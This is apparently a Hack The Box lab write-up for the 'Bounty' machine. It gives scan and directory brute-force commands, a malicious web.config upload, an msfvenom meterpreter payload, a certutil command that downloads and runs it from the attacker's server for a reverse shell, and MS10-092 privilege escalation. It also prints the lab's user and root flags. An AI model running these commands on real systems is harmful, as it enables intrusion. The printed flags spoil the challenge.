#HTB - Bounty - Writeup 

**Level**:Not too Easy 

-----------------------------------------RECON------------------------------------- 

Starting with Nmap 
`sudo nmap -sV -sC  -T5 10.129.16.192` 
<img width="580" height="343" alt="image" src="https://github.com/user-attachments/assets/932c139f-d35d-4b87-b413-096726af899c" /> 

I came to know http site is there. 

AGAIN!!!!!!!!!!!BRUTEFORCE!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 

Note : This is ASP.NET 

Use the common.txt 

`gobuster dir -u http://10.129.16.192/  -w /usr/share/wordlists/dirb/common.txt -t 200  -x .aspx` 

<img width="656" height="355" alt="image" src="https://github.com/user-attachments/assets/670a6297-c902-4a42-a311-e705a131fa96" /> 

There is file upload functionality, i tried uploading different files. The .config file is accepting. (Use the web.config) to exploit for a reverse shell 
Use MSFvenom to create a reverse_tcp payload, create a connection . 

` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4001  -f exe -o payload.exe` 

Modify this line to download from Python3 HTTP Server 

`Set cmd1 = wShell1.Exec("certutil -urlcache -split -f http://10.10.14.12:8000/payload.exe C:\\users\\public\\shell.exe")` 

It'll download from your server . To get Rev shell , open meterpreter and set the values to get rev shell ; 

`Set cmd1 = wShell1.Exec("cmd /c C:\\users\\public\\shell.exe")` 

!!!!!!!!!!!!!!BOOM!!!!!!!!!!!!!!!!! 

Got your Rev. Shell 

Don't waste the time, run Suggester to find an in-house exploit present. But unfortunately i didnt get any good exploits . I searched on google redirects me to [MS10-092](https://www.exploit-db.com/exploits/19930)
I jumped directly onto `windows/local/ms10_092_schelevator` .

----------------------------Privilege Escalation---------------------------------------------------------  

If any error occurs 

<img width="1919" height="153" alt="image" src="https://github.com/user-attachments/assets/46746b63-47f7-42ff-9374-613d2c17762c" /> 

`set AutoCheck false`

Now RUN!!!!!!!!!!!!  



> User Flag : ccac8184a281ba32eba07b2d20e3b7c5 


> Rootflag ; 0b6cf724e5f8468a09d9c4ae73d99200





 


